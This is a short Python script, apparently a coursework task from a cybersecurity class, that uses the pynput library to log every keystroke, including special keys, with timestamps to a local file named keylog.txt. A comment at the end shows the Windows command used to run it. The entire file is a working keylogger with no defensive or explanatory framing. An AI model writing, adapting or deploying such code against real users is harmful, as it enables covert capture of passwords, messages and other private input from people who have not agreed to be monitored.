from pynput import keyboard
import logging

# Save logs to this file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


#"C:\Users\ADMIN\AppData\Local\Programs\Python\Python311\python.exe" "C:\Users\ADMIN\OneDrive\Desktop\CEP\CEP.html\cyber\Task@4.py"